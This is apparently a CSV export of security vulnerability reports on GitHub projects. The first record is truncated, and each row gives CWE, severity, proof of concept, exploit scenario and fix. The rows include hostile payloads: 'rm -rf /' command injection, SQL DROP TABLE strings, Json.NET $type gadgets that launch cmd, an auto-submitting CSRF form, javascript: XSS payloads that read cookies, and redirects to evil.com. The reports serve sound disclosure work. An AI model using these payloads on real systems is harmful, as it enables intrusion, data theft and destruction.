The system disables critical JWT signature verification by setting verify_signature=False during token decoding.
This flaw allows any unauthorized or tampered JWT token to be accepted, completely bypassing authentication and integrity checks.

Exploit Scenario:
An attacker crafts a fake JWT token with manipulated scopes or expiry time and submits it to the server.
Since the signature is not checked, the server accepts the attacker’s token as valid.
This could allow the attacker to:

Access restricted APIs

Escalate privileges

Perform actions as another user.

Why It Happens:
The vulnerability occurs because the application explicitly disables JWT signature verification by configuring options={'verify_signature': False} while decoding tokens.
This removes all security provided by JWT and allows any arbitrary, invalid, or forged token to be trusted by the server.

Security Implications:
If exploited:

Attackers can impersonate legitimate users.

Sensitive APIs and resources can be accessed without proper authentication.

Severe data breaches, privilege escalations, and system compromises are possible.

Entire authentication and authorization mechanisms are rendered useless.

Suggested Fix:
Always enable JWT signature verification when decoding tokens.
Explicitly specify the algorithms used (such as 'RS256') to ensure only valid tokens are accepted:


jwt.decode(encoded_token, algorithms=['RS256'], options={'verify_signature': True})
Signature verification ensures that the token was generated by a trusted authority and has not been altered."
129,1745898731489,https://github.com/webglearth/webglearth2/src /api-l.html,CWE-353,Low,2025-04-29T03:52:11.000Z,2025-04-29T06:48:59.000Z,"Vulnerability Type:
CWE-353: Missing Support for Integrity Check

Proof of Concept:
In the original HTML:

<script src=""http://cdn.leafletjs.com/leaflet-0.7.2/leaflet.js""></script>
There is no integrity attribute.
Thus, if the remote file is compromised (man-in-the-middle attack, CDN breach, etc.), the browser will execute it without any verification.

Severity:
LOW

Root Cause:
The web page includes external JavaScript and CSS files without specifying an integrity attribute.
Without an integrity check, browsers have no way to validate that the downloaded resource is unmodified and trustworthy.

Exploit Scenario:
An attacker compromises the Leaflet CDN and injects malicious JavaScript into the hosted leaflet.js file.
When a user loads the page, the malicious script executes automatically in their browser — leading to data theft, account takeover, or malware distribution.

Why It Happens:
The developer failed to add integrity and crossorigin attributes when referencing third-party scripts or styles.
Without integrity metadata, browsers blindly trust all loaded external resources, even if they have been tampered with.

Security Implications:
If exploited:

Users can be exposed to malicious scripts.

Cross-site scripting (XSS), session hijacking, data exfiltration.

Large-scale supply-chain attacks become possible if CDNs are targeted.

Suggested Fix:
Add an integrity attribute with the SHA384 hash of the resource and a crossorigin=""anonymous"" attribute to all <script> and <link> tags referencing external resources:

<script src=""https://cdn.example.com/file.js"" integrity=""sha384-abc123..."" crossorigin=""anonymous""></script>
Browsers will verify the hash before executing the resource, ensuring tampering is detected and blocked automatically."
130,1745899155538,https://github.com/hua1995116/webchat/utils /cmd.js,CWE-78,High,2025-04-29T03:59:15.000Z,2025-04-29T06:50:48.000Z,"Vulnerability Type:
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Proof of Concept:
In the original code:

exec(cmd, (err, stdout, stderr) => {...})
if cmd is user-controlled and not sanitized, an attacker can inject shell metacharacters (&&, ;, |) to execute arbitrary commands.

Example:


cmder(""ls && rm -rf /"")
could lead to catastrophic system damage.

Severity:
HIGH

Root Cause:
The code uses child_process.exec() directly with concatenated or dynamic command strings.
Since exec() invokes a shell, any unsanitized input is interpreted as shell commands, creating opportunities for command injection attacks.

Exploit Scenario:
An attacker tricks the server by injecting payloads like:


echo safe_input && rm -rf /
This executes additional malicious commands after a legitimate one.
It can lead to file deletions, data breaches, or full server compromise.

Why It Happens:
The vulnerability happens because exec() parses its input string via the shell.
Without strict input validation, anything injected into the command string will be executed as part of the shell instructions.

Security Implications:
Successful exploitation allows attackers to:

Execute arbitrary OS commands.

Delete or modify server files.

Access sensitive environment variables.

Escalate privileges on the server.

Fully compromise the application and infrastructure.

Suggested Fix:
Use child_process.spawn() instead of exec().
spawn():

Passes command and arguments separately.

Does not invoke a shell (unless explicitly specified).

Prevents interpretation of injected shell metacharacters.

Example:


const { spawn } = require('child_process');
const child = spawn('echo', ['HelloWorld']);
Always separate the executable and its parameters to eliminate injection risks."
131,1745899905868,https://github.com/dvlab-research/LLMGA/llmga/diffusers/scripts/change_naming_configs_and_checkpoints.py,CWE-20,High,2025-04-29T04:11:45.000Z,2025-04-29T07:01:32.000Z,"Vulnerability Type:
CWE-20: Improper Input Validation

Proof of Concept:


import torch

# Bad practice: vulnerable to code execution via pickle
model = torch.load('model.pkl')
This line is dangerous because torch.load() uses Python’s pickle module, which executes arbitrary code during deserialization. If model.pkl contains malicious pickle payloads, executing this line may result in arbitrary code execution. This is especially risky if the .pkl file was downloaded or received from an untrusted source.

Severity:
HIGH

Root Cause:
The root cause is using torch.load() to deserialize data from untrusted sources without validating its contents. PyTorch internally uses pickle, which does not restrict what classes or code can be executed.

Exploit Scenario:
An attacker uploads a malicious .pkl file containing a __reduce__() method that executes os.system(""rm -rf /""). When the file is loaded via torch.load(), the attacker's code runs with full privileges.

Why It Happens:
The vulnerability occurs because torch.load() does not enforce strict input validation or safe deserialization. The function assumes that the content is trustworthy and allows execution of any code defined in the pickled object.

Security Implications:
If exploited, an attacker could execute arbitrary system commands, read or write files, install malware, or completely compromise the host system. This is particularly severe in shared or production environments.

Suggested Fix:
Avoid using torch.load() for loading model files from unknown sources. Instead:

Save only the state_dict of the model.

Load using torch.load() only if the contents are expected to be a dict.

Always validate the type of loaded object before using it.


# Safer alternative
model = MyModel()
state_dict = torch.load('model_state_dict.pth', map_location='cpu')
if not isinstance(state_dict, dict):
    raise ValueError(""Invalid model file"")
model.load_state_dict(state_dict)
"
132,1745903893490,https://github.com/WebVella/WebVella-ERP/blob/master/WebVella.Erp.Web/Controllers/WebApiController.cs,CWE-89,High,2025-04-29T05:18:13.000Z,2025-04-29T05:39:28.000Z,"Vulnerability Type:
CWE-89: Improper Neutralization of Special Elements used in an SQL
[Line 1172,2045,2532,2564,2593,2739] Command ('SQL Injection')
Proof of Concept (Elaborated):
Vulnerable Code:
var findResult = recMan.Find(query);
and
return DoResponse(new EntityRelationManager().Create(relation));
Step-by-Step Explanation:
1.	Problem with recMan.Find(query):
o	The query object is often built using user-controlled inputs without complete sanitization.
o	If the EntityQuery or EQL allows users to inject unexpected data or conditions, it could result in unsafe SQL execution.
2.	Problem with EntityRelationManager().Create(relation):
o	If the relation object is created based on user input without strict field validation, malicious payloads could manipulate the database layer.
3.	How to Attack:
o	Send specially crafted input inside query or relation fields.
o	Attempt to inject raw SQL fragments, like:
o	' OR 1=1 --
or
' DROP TABLE Users --
Example Exploit:
Input Payload Example:
{
  ""entityName"": ""users; DROP TABLE users; --""
}
If query construction is weak, the backend might attempt to run:
SELECT * FROM users; DROP TABLE users; -- WHERE ...
Result:
•	Complete destruction of database tables.
•	Unauthorized data exposure.
Severity:
Critical (Database Compromise → Full Data Theft or Destruction)
Root Cause:
•	User input (query, relation) is directly embedded into database operations without proper sanitization, encoding, or parameter binding.
Exploit Scenario:
An attacker submits crafted data through an API that results in an unfiltered query object or relation object.
This leads the ORM/database to execute unintended commands — causing data leaks, unauthorized data modification, or even full database deletion.
Why It Happens:
Because user-controlled inputs are used to construct dynamic queries without strictly validating allowed fields, structures, or using prepared statements.
Security Implications:
If exploited:
•	Full database compromise
•	Sensitive information leak (usernames, passwords, financial data)
•	Database corruption or data loss
•	Service downtime or permanent damage
Suggested Fix:
- var findResult = recMan.Find(query);
+ ValidateQueryFields(query);
+ var findResult = recMan.Find(SanitizeQuery(query));
and
- return DoResponse(new EntityRelationManager().Create(relation));
+ ValidateRelationData(relation);
+ return DoResponse(new EntityRelationManager().Create(SanitizeRelation(relation)));

"
133,1745904081324,https://github.com/smalltong02/keras-llm-robot/WebUI/Server /api.py,CWE-942,Very Low,2025-04-29T07:29:34.000Z,2025-04-29T07:38:26.000Z,"Vulnerability Type:
CWE-942: Permissive Cross-domain Policy with Untrusted Domains

Severity:
Very Low

Root Cause:
The application configures CORS middleware to allow all origins (allow_origins=[""*""]) without restriction. This means that requests from any domain, including malicious or unauthorized ones, are accepted, making the server vulnerable to cross-origin interactions.

Exploit Scenario:
An attacker creates a malicious website with JavaScript that sends authenticated requests to the FastAPI backend, exploiting an active user session. Since CORS is configured to accept any origin, the backend responds to the attacker's domain, leaking sensitive information or allowing unauthorized actions like form submission or data extraction.

Why It Happens:
CORS is meant to control which domains are permitted to interact with a web server’s resources. By setting allow_origins=[""*""], the server removes all restrictions, defeating the purpose of the CORS mechanism. This oversight is often made for convenience in development but should never be used in production.

Security Implications:
If a user is authenticated (e.g., via cookies or session tokens), a malicious site can make cross-origin API calls on their behalf. This may allow data theft, account manipulation, or unauthorized access to backend features—especially dangerous in applications handling personal or sensitive information.

Proof of Concept:

app.add_middleware(
    CORSMiddleware,
    allow_origins=[""*""],
    allow_credentials=True,
    allow_methods=[""*""],
    allow_headers=[""*""],
)
Any external website can now call APIs with user credentials attached, bypassing origin checks.

Suggested Fix:
Replace the wildcard origin with a strict list of trusted domains. Limit allowed methods and headers to only what's necessary. Example:


allowed_origins = [""https://yourdomain.com"", ""https://admin.yourdomain.com""]

app.add_middleware(
    CORSMiddleware,
    allow_origins=allowed_origins,
    allow_credentials=True,
    allow_methods=[""GET"", ""POST""],
    allow_headers=[""Content-Type"", ""Authorization""],
)
Additionally, ensure sensitive endpoints are protected by proper authentication and CSRF defenses."
134,1745904516813,https://github.com/dvlab-research/LISA /merge_lora_weights_and_save_hf_model.py,CWE-502,High,2025-04-29T05:28:36.000Z,2025-04-29T07:08:53.000Z,"Vulnerability Type:
CWE-502: Deserialization of Untrusted Data

Proof of Concept:

state_dict = torch.load(args.weight, map_location=""cpu"")
model.load_state_dict(state_dict, strict=True)
The above code uses torch.load() to deserialize a file.

torch.load() internally uses pickle, which is unsafe because it allows arbitrary object loading.

If an attacker provides a malicious file, arbitrary code execution could occur immediately when loading.

Severity:
HIGH

Root Cause:
The vulnerability is caused by trusting all deserialized objects from torch.load() without validating their type. Since PyTorch uses pickle internally, this allows the loading of arbitrary and potentially malicious objects, resulting in a high-risk security flaw.

Exploit Scenario:
An attacker could upload or inject a malicious .pth or .bin file into the server. When the server runs torch.load() on that file, it executes arbitrary system commands, leading to full system compromise without user awareness.

Why It Happens:
The vulnerability occurs because torch.load() automatically unpickles objects without checking what is being deserialized. There is no validation step to ensure that the file contains only safe, expected structures like a model state dictionary.

Security Implications:
If exploited, the attacker could achieve full remote code execution, allowing them to install malware, extract sensitive information, delete files, or take complete control over the server running the vulnerable code.

Suggested Fix:
After loading the file with torch.load(), verify that the loaded object is a dictionary (state_dict). Raise an exception if the loaded object is not of the expected safe type. Alternatively, use safer serialization formats like ONNX or libraries like Fickling for model loading.

Example fix:


state_dict = torch.load(args.weight, map_location=""cpu"")
if not isinstance(state_dict, dict):
    raise ValueError(""Loaded object is not a state_dict dictionary. Possible unsafe pickle detected."")
model.load_state_dict(state_dict, strict=True)"
135,1745904789842,https://github.com/ateeshkumar/Deep-Known-Firebase/blob/main/src/pages/Movies.jsx,"CWE-706, CWE-20",Medium,2025-04-29T05:33:09.000Z,2025-04-29T07:15:03.000Z,"Vulnerability Type:
CWE-706: Use of Incorrectly-Resolved Name or Reference
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
CWE-20: Improper Input Validation
OWASP A01:2021 – Broken Access Control
OWASP A07:2021 – Cross-Site Scripting (XSS)

 Proof of Concept:
Navigation via Unvalidated item.id:

onClick={() => navigate(`/movies/${item.id}`)}
If a malicious item.id like ../../admin or /evil is injected into Firestore, the app could navigate to unintended paths.

Unsafe <img src={item.url}>:

<img src={item.url} alt="""" />
If item.url is javascript:alert(1), some browsers might trigger JavaScript execution or log security warnings.

No Error Handling:

Failure of Firestore fetch (getDocs) is not caught, so users see an infinite spinner and no error message.

 Severity:
Medium

These are not remote code execution issues, but:

Broken routing

Stored XSS (if browser accepts javascript: URLs)

Unhandled API errors

All significantly impact user experience, security, and trust.

 Root Cause:
The application trusts data from Firestore (a user-controllable database) without validating id or url fields. Additionally, there is no error handling logic around async data fetching, leading to infinite loading states and potential exposure to crafted input.

Exploit Scenario:
An attacker with write access to Firestore (or who tricks an admin into creating a bad record) inserts:

{
  ""id"": ""../../admin"",
  ""url"": ""javascript:alert('hacked')""
}
Then convinces users to visit the /movies page. Clicking the card can:

Trigger navigation to a restricted area (/admin)

Execute malicious scripts via img tag if not properly sanitized

 Why It Happens:
There is no validation layer between Firestore and the frontend React code. The code assumes that all Firestore records are trustworthy. React doesn't automatically sanitize src, href, or id values, so improper use can lead to navigation tampering or script execution.

Security Implications:
If exploited:

Malicious IDs can lead to unintended page routing or IDOR

Unsafe image URLs can trigger XSS on older or less secure browsers

App can break (or hang) due to unhandled async errors

Users lose trust and the app is exposed to social engineering

 Suggested Fix:
Validate item.id before passing into router — allow only alphanumeric or safe characters (e.g., regex: /^[a-zA-Z0-9_-]+$/)

Validate item.url with URL() constructor and only allow https: or http:

Wrap Firestore fetches in try-catch and show a fallback UI if it fails

Sanitize image input before storing in Firestore (preferred), or validate at render time (minimum)

"
136,1745904971531,https://github.com/WebVella/WebVella-ERP/blob/master/WebVella.Erp/Jobs/JobDataService.cs,CWE-502,High,2025-04-29T05:36:11.000Z,2025-04-29T05:41:27.000Z,"Vulnerability Analysis for JobDataService.cs

Vulnerability Type:
CWE-502: Deserialization of Untrusted Data
[line: 27,297,346,96]
Proof of Concept (Elaborated):
Vulnerable Code:
JsonSerializerSettings settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };

Step-by-Step Explanation:
1.	Problem:
Setting TypeNameHandling = TypeNameHandling.All tells Json.NET to trust type information in JSON when deserializing.
That means if an attacker supplies malicious JSON containing a $type field, arbitrary types from assemblies could be loaded and instantiated during deserialization.
2.	How to Attack:
An attacker could inject a payload like:
3.	{
4.	  ""$type"": ""System.Windows.Data.ObjectDataProvider, PresentationFramework"",
5.	  ""MethodName"": ""Start"",
6.	  ""MethodParameters"": [""cmd"", ""/c calc.exe""]
7.	}
o	This payload causes arbitrary code execution (e.g., opening Calculator).
o	Much worse payloads (like downloading malware) are possible.

Example Exploit:
Attacker Payload:
{
  ""$type"": ""System.Diagnostics.Process, System"",
  ""StartInfo"": {
    ""FileName"": ""cmd.exe"",
    ""Arguments"": ""/c whoami > C:\\pwned.txt""
  }
}
Result:
•	When deserialized, the server spawns a process and executes attacker-controlled commands.

Severity:
Critical (Remote Code Execution [RCE])

Root Cause:
Using TypeNameHandling.All blindly trusts user-supplied type metadata and deserializes arbitrary classes, leading to possible execution of unintended dangerous code paths.

Exploit Scenario:
An attacker sends malicious JSON with dangerous $type fields.
When deserialized, the server runs attacker-controlled code, which could lead to:
•	Remote Command Execution
•	Complete Server Takeover
•	Data Theft
•	Service Destruction

Why It Happens:
Because TypeNameHandling is set to All, allowing polymorphic deserialization without restricting which types are allowed — trusting any type name in the input.

Security Implications:
If exploited:
•	Attackers can execute arbitrary code on your server.
•	Total system compromise is possible.
•	Ransomware deployment, data leaks, system wipes can happen.
Suggested Fix:
--- JobDataService.cs	2025-04-27
+++ JobDataService_fixed.cs	2025-04-27
@@
- JsonSerializerSettings settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All };
+ JsonSerializerSettings settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.None };
"
137,1745906003400,https://github.com/sastava007/Traffic-Control-Plus-Plus/Smart Contract && Mailing API/src /index.html,CWE-353,Very Low,2025-04-29T05:53:23.000Z,2025-04-29T07:09:34.000Z,"Vulnerability Type:
CWE-353: Missing Support for Integrity Check

Proof of Concept:
The vulnerable code includes external scripts without the integrity attribute:

<script src=""https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js""></script>
<script src=""https://oss.maxcdn.com/respond/1.4.2/respond.min.js""></script>
These lines load JavaScript from external CDNs, but the absence of the integrity attribute allows these files to be replaced with malicious content by an attacker who compromises the CDN or performs a man-in-the-middle (MitM) attack.

Severity:
LOW

Root Cause:
The root cause is the missing integrity attribute on externally loaded scripts, which prevents the browser from verifying the authenticity of the fetched file. Without this attribute, there is no way to ensure the file has not been modified by an attacker.

Exploit Scenario:
An attacker compromises the CDN hosting the html5shiv or respond scripts. When a user loads the page, the modified malicious script executes in the user's browser, potentially stealing sensitive information, injecting keyloggers, or hijacking session cookies.

Why It Happens:
The application does not implement Subresource Integrity (SRI) for external scripts. This security feature is designed to allow browsers to verify that files they fetch (e.g., from a CDN) are delivered without unexpected manipulation.

Security Implications:
Without integrity checks, any external script could be modified by a malicious actor to include harmful code. If exploited, this could result in client-side script execution, data theft, phishing, or other malicious behavior that undermines the trust and security of the application.

Suggested Fix:
Add the integrity and crossorigin=""anonymous"" attributes to all external script tags that load third-party code. This ensures that browsers will verify the content before execution, protecting against tampered scripts and MitM attacks.

Example Fix:

<script src=""https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"" integrity=""sha384-rkct3+bwJNTKG3S0sLMgxi0zG4vF1E1oyWJWZcg1KOHqPYY8kXqlO+6SWdBQWiQ/"" crossorigin=""anonymous""></script>"
138,1745906793130,https://github.com/vidhi-github/Music-web-app/blob/main/src/components/Sidebar.jsx,CWE-601,Critical,2025-04-29T06:06:33.000Z,2025-04-29T06:47:39.000Z,"Vulnerability Type:
CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)
OWASP A01:2021 – Broken Access Control

 Proof of Concept:

<a href={`${auth?.user?.userId}`} className=""side-nav-link"">
The userId value from the auth context is directly embedded into an <a href>.

If an attacker injects a value like //evil.com, the browser interprets this as an external link, causing redirection to an attacker-controlled domain.

For example:

auth.user.userId = ""//evil.com""
Clicking the ""Profile"" button would navigate the victim to https://evil.com.

 Severity:
Critical
This is a high-risk vulnerability due to its potential for phishing, redirect loops, and session hijacking.

 Root Cause:
The application directly inserts user-controlled input (auth.user.userId) into an anchor tag’s href attribute without validating or sanitizing the input. Browsers treat certain prefixes (e.g., //, http://, javascript:) as absolute URLs or JavaScript payloads, enabling unintended behaviors.

 Exploit Scenario:
An attacker registers or modifies their account’s userId to ""//evil.com"" or ""javascript:alert('hacked')"". When any user clicks the “Profile” button from the sidebar, they are unknowingly redirected to a malicious website, potentially leading to phishing, credential theft, or malware distribution.

 Why It Happens:
The system assumes that the userId is safe and represents an internal routing path. However, without constraints or validation, it opens the door for injection of arbitrary URL schemes (e.g., http, javascript) or redirection outside the trusted domain. The design lacks input sanitization or type-checking for routing values.

Security Implications:
If exploited:

Users may be redirected to malicious external sites.

Can lead to phishing attacks, token/session theft, or loss of user trust.

Could be used for clickjacking, social engineering, or XSS payload delivery via javascript: links.

Breaks internal navigation, leading to routing logic abuse or privilege escalation.

Suggested Fix:
Never use user-controlled data directly in <a href> or routing links.

Use internal-only routing via React Router’s Link:


<Link to={`/profile/${auth?.user?.userId}`} className=""side-nav-link"">...</Link>
 Validate userId format before routing (e.g., only allow alphanumeric/slug-safe IDs using regex).

Sanitize or reject dangerous values (javascript:, //, http:) on both frontend and backend.

Optionally, encode the ID or use a centralized route resolver that can whitelist safe paths."
139,1745907304870,https://github.com/akaunting/akaunting/blob/master/resources/assets/js/mixins/global.js,CWE-601,Medium,2025-04-29T06:15:04.000Z,2025-04-29T07:19:18.000Z,"Vulnerability Type:
CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

Proof of Concept (Elaborated):
Vulnerable Code: [1159,395,517]
if (response.data.redirect) {
    window.location.href = response.data.redirect;
}

Step-by-Step Explanation:
1.	Problem:
The code takes the redirect field from a server API response and directly assigns it to window.location.href without validating if it's a safe URL.
2.	How to Attack:
If an attacker controls the server response or tricks the API to include a malicious external URL, the browser will silently redirect the user to a malicious third-party site.
3.	Effect:
This allows attackers to:
o	Phish users
o	Steal session cookies
o	Trick users into installing malware

Example Exploit:
Suppose an attacker injects:
{
  ""redirect"": ""https://evil-attacker.com/phish""
}
The browser will then do:
window.location.href = ""https://evil-attacker.com/phish"";
Result:
•	User is silently redirected to a fake login or malware site.

Severity:
High (Leads to Phishing, Session Hijacking)

Root Cause:
The application blindly trusts user-controlled data (response.data.redirect) and performs a browser redirect without validating that the destination URL is internal or safe.

Exploit Scenario:
An attacker exploits an endpoint or injects parameters that cause the API to return a malicious external redirect URL, and users are redirected without warning.

Why It Happens:
Because there is no origin validation on the redirect URL, nor any safe whitelist enforcement.

Security Implications:
If exploited:
•	Users can be tricked into phishing pages.
•	Users might install malware.
•	Brand trust of your application is severely damaged.

Suggested Fix:
--- global.js	2025-04-27
+++ global_fixed.js	2025-04-27
@@
- if (response.data.redirect) {
-     window.location.href = response.data.redirect;
- }
+ if (response.data.redirect) {
+     const allowedOrigin = window.location.origin;
+     try {
+         const targetUrl = new URL(response.data.redirect, allowedOrigin);
+         if (targetUrl.origin === allowedOrigin) {
+             window.location.href = targetUrl.href;
+         } else {
+             console.error('Blocked open redirect attempt to:', targetUrl.href);
+         }
+     } catch (e) {
+         console.error('Invalid redirect URL');
+     }
+ }
"
140,1745908585270,https://github.com/zulip/zulip/blob/main/zerver/views/auth.py,CWE-352,Critical,2025-04-29T06:36:25.000Z,2025-04-29T07:24:08.000Z,"Vulnerability Type:
CWE-352: Cross-Site Request Forgery (CSRF)
[Line 1061 1105 1165 1276 6001]
Proof of Concept (Elaborated):
Vulnerable Functions:
@csrf_exempt
@require_post
def jwt_fetch_api_key(...)
@csrf_exempt
@require_post
def api_fetch_api_key(...)
@csrf_exempt
@require_safe
def api_get_server_settings(...)
@csrf_exempt
def saml_sp_metadata(...)

Step-by-Step Explanation:
1.	Problem:
o	These functions are marked with @csrf_exempt.
o	They perform sensitive actions (e.g., fetching API keys, returning sensitive metadata).
o	No CSRF token validation means any external malicious page can trick the user's browser into making these requests automatically.
2.	How to Attack:
o	An attacker could create a fake page with hidden forms or JavaScript that silently sends POST requests to your application while the user is authenticated.
3.	Effect:
o	Unauthorized actions happen without the user’s intent.
o	Sensitive data like API keys are leaked.

Example Exploit:
Malicious HTML Form:
<form action=""https://yourdomain.com/api/v1/fetch_api_key"" method=""POST"">
  <input type=""hidden"" name=""username"" value=""victim@example.com"" />
  <input type=""hidden"" name=""password"" value=""password"" />
</form>
<script>document.forms[0].submit();</script>
Result:
•	The user is tricked into leaking their API key unknowingly.

Severity:
Critical (Full Account Hijack Risk)

Root Cause:
The CSRF protection is explicitly disabled with @csrf_exempt even on endpoints that:
•	Perform authentication
•	Fetch API keys
•	Provide sensitive server metadata

Exploit Scenario:
An attacker sends a malicious link or hosts an auto-submitting form that abuses these APIs while the victim is authenticated, extracting sensitive information like API keys or triggering unintended authentication operations.

Why It Happens:
Because CSRF protection (cross-site request checking) is bypassed (@csrf_exempt) without compensating defenses like:
•	CSRF tokens
•	Double-submit cookies
•	Strict SameSite cookie attributes

Security Implications:
If exploited:
•	Attacker could steal API keys or session tokens.
•	Unauthorized access to user accounts.
•	Potential system-wide compromise if admin users are targeted.
•	Severe trust loss with users.

Suggested Fix:
--- auth.py	2025-04-27
+++ auth_fixed.py	2025-04-27
@@
- @csrf_exempt
- @require_post
- def jwt_fetch_api_key(
+ @require_post
+ @csrf_protect
+ def jwt_fetch_api_key(

- @csrf_exempt
- @require_post
- def api_fetch_api_key(
+ @require_post
+ @csrf_protect
+ def api_fetch_api_key(

- @csrf_exempt
- @require_safe
- def api_get_server_settings(
+ @require_safe
+ @csrf_protect
+ def api_get_server_settings(

- @csrf_exempt
- def saml_sp_metadata(
+ @csrf_protect
+ def saml_sp_metadata(
"
141,1745909545521,https://github.com/gazpachu/hypatia/src/app/core/common /helpers.jsx,CWE-79,Medium,2025-04-29T06:52:25.000Z,2025-04-29T07:11:14.000Z,"Vulnerability Type:
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Proof of Concept:

<div
  className=""card-content""
  dangerouslySetInnerHTML={{
    __html: converter.makeHtml(item.content1)
  }}
/>
The code directly injects HTML content (item.content1) into the DOM using dangerouslySetInnerHTML, without sanitization, which may lead to XSS.

Severity:
Medium

Root Cause:
The application renders raw HTML using dangerouslySetInnerHTML from untrusted sources (e.g., Markdown converted user content) without sanitizing it first, which is a security risk.

Exploit Scenario:
An attacker could inject malicious scripts (like <img src=x onerror=alert('XSS')>) into content1 that gets rendered in the DOM. This would allow JavaScript execution in the victim’s browser.

Why It Happens:
The application uses dangerouslySetInnerHTML without input validation or sanitization. This is inherently risky if content is even partially user-controlled.

Security Implications:
Successful exploitation can result in XSS, allowing attackers to steal session tokens, deface pages, or launch phishing attacks directly from the web page.

Suggested Fix:
Sanitize all HTML content before rendering it using dangerouslySetInnerHTML. Use a library like DOMPurify to strip dangerous HTML elements or JavaScript handlers from the content."
142,1745909576871,https://github.com/koajs/koa/tree/2.16.0,CWE-79,Medium,2025-04-29T06:52:56.000Z,2025-04-29T15:31:41.000Z,"Summary
Koa versions < 2.16.1 and < 3.0.0-alpha.5 are vulnerable to a reflected Cross-Site Scripting (XSS) flaw in the ctx.redirect() helper, allowing untrusted URL inputs to execute JavaScript in users’ browsers 

. This issue (CVE-2025-32379, GHSA-x2rg-q646-7m2v) arises because the redirect body embeds an HTML <a> tag with the raw URL parameter, and it was patched in 2.16.1 and 3.0.0-alpha.5 

. Below is a detailed explanation, five exploitable test-case scenarios, and the real-world impact of this vulnerability.

Vulnerability Overview
In Koa versions prior to the patch, calling ctx.redirect(url) produces a response body like:

Redirecting to <a href=""URL"">URL</a>.
Without sanitization, an attacker-controlled URL can include malicious JavaScript schemes (e.g. javascript:) or crafted attributes, leading to script execution on page load 

. The flaw is classified as CWE-79: Improper Neutralization of Input During Web Page Generation and carries a CVSS v3.1 score of 5.0 (Medium) 

. Although redirects often require user interaction, many browsers or frameworks auto-follow or render the link, making exploitation straightforward 


Exploitable Test-Case Scenarios
Basic javascript: Scheme

PoC:

app.use(async ctx => ctx.redirect('javascript:alert(""XSS1"")'));
Effect: A user’s browser executes alert(""XSS1"") when the link is auto-followed or clicked 

Data-URI Payload

PoC:

app.use(async ctx => {
  const payload = Buffer.from('alert(document.cookie)').toString('base64');
  ctx.redirect(`javascript:eval(atob('${payload}'))`);
});
Effect: Executes alert(document.cookie), leaking session cookies to the attacker’s code 

Attribute-Breaking Injection

PoC:

const evil = 'javascript:alert(1);"" onmouseover=""alert(2)';
app.use(async ctx => ctx.redirect(evil));
Effect: The injected onmouseover attribute triggers alert(2) when the victim hovers over the link 

Open-Redirect Combined with XSS

PoC:

app.use(async ctx => {
  const next = ctx.query.next || 'javascript:alert(""pwn"")';
  ctx.redirect(next);
});
Exploit URL:
http://victim.app/?next=javascript:alert(document.domain)

Effect: Redirects and immediately executes alert(document.domain), confirming site compromise 

Unicode-Based WAF Bypass

PoC:

app.use(async ctx => ctx.redirect('\uFF1Ajavascript:alert(3)'));
Effect: Uses a full-width colon (U+FF1A) to evade naive filters, but still executes alert(3) 

Impact
Phishing & Credential Theft: Attackers can craft redirects that appear legitimate while stealing login credentials via fake login forms injected through XSS 


Session Hijacking: Stolen cookies or tokens can enable full session takeover, leading to unauthorized access to user accounts or administrative interfaces 

CSRF Amplification: Malicious scripts can issue background requests to sensitive endpoints (e.g., funds transfers) using the victim’s credentials, bypassing usual CSRF defenses 


Persistent Malware: Injected scripts can write to localStorage or IndexedDB, establishing persistent, stealthy malware for data exfiltration or surveillance 

Regulatory & Reputational Damage: XSS vulnerabilities violate data-protection standards (like PCI-DSS and GDPR), exposing organizations to fines and brand erosion 
osv.dev


Mitigation
Upgrade Koa immediately to ≥ 2.16.1 or 3.0.0-alpha.5, where the ctx.redirect() function no longer emits an HTML anchor, neutralizing this XSS vector 
. As a defense-in-depth measure, validate or whitelist redirect URLs to only allow trusted domains or paths before invoking ctx.redirect() "
143,1745910149308,/DhruvLamba/File-Storage/blob/b7cb16a5dec69217e4232559ec5d7d20eafa4fbe/2.py#L163,CWE-434: Unrestricted Upload of File with Dangerous Type,Medium,2025-04-29T07:02:29.000Z,2025-04-29T07:46:39.000Z,"POC: Unauthorized File Upload Possible

Steps to Reproduce:
Start the Flask server.

Go directly to /upload endpoint, upload a file without logging in.

File is accepted and stored on server in ./uploads/.
Vulnerable code: 
@app.route('/data', methods=['GET', 'POST'])
def upload_file():

Root Cause Analysis:
No authentication or authorization mechanisms are applied to the file upload endpoint (/data).
Any user, regardless of their identity or role, can upload files to the server.
This opens the application to abuse, such as unauthorized file uploads, storage abuse, and potential injection of malicious files.
Exploit Scenarios:
Unrestricted file upload (e.g., a .php, .sh, .exe payload).
Attacker uploads a web shell or malware.
Abuse of server storage leading to DoS.

Why This Happens:
Developer forgot to wrap upload routes with authentication verification.
No check if session['role'] or a login flag exists.

Security Implications:
1. Remote Code Execution (if server parses uploaded files)
2. Denial of Service (storage flooding)
3. Malware Hosting on Your Server

Suggested Fix:
Before allowing upload:
1.Verify session authentication.
2.Restrict file types strictly.
3.Sanitize filenames.
example:-
@app.route('/data', methods=['GET', 'POST'])
def upload_file():
    # Ensure the user is authenticated
    if 'role' not in session or session['role'] not in ['admin', 'user']:
        flash('Unauthorized access')
        return redirect('/signin')

    tools.empty_folder('uploads')
    if request.method == 'POST':
        # Check if the post request has the file part
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        
        file = request.files['file']
        
        # Validate the filename
        if file.filename == '':
            flash('No selected file')
            return 'NO FILE SELECTED'

        if file and allowed_file(file.filename):
            try:
                # Save file securely
                filename = secure_filename(file.filename)
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
                
                # Log upload details for auditing
                with open('raw_data/meta_data.txt', 'a') as meta_file:
                    meta_file.write(filename + '\n')
                
                # Encrypt the file after upload
                return start_encryption()

            except Exception as e:
                flash(f""File upload failed: {str(e)}"")
                return 'File upload failed'
        else:
            flash('Invalid file type')
            return 'Invalid File Format!'
    
    return 'Invalid Request!'

"
